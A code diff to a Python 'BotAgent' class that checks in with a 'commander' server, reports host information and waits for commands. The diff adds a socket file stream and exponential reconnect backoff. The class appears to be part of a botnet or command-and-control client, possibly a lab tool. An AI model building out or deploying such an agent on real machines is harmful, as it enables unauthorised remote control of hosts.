@@ -75,6 +75,7 @@ class BotAgent:
             self.sock.close()
             self.sock = socket(AF_INET, SOCK_STREAM)
             self.sock.connect((self.host, self.port))
+            self.file_stream = self.sock.makefile("b")
             self.last_online = time.time()
         except Exception as err:
             print("Unexpected error occurred when connecting to commander: {}".format(err))
@@ -99,6 +100,9 @@ class BotAgent:
             print("Bot-agent {}-{} has been successfully added by commander".format(self.hostname, self.uuid))
             self.__check_for_commands()
         else:
+            if self.reconnect_count < self.max_reconn:
+                self.reconnect_count += 1
+            time.sleep(pow(2, self.reconnect_count))
             self.__self_identify()
 
     def __send_agent_info(self):
@@ -107,7 +111,8 @@ class BotAgent:
             self.__self_identify()
         try:
             print("Sending botHostInfo from bot-agent {} to commander".format(self.hostname))
-            self.sock.sendall(payload)
+            self.file_stream.write(payload)
+            self.file_stream.flush()
         except Exception as err:
             print("Unexpected error occurred while sending botHostInfo of peer {} to commander: {}".format(self.hostname, err))
             return False
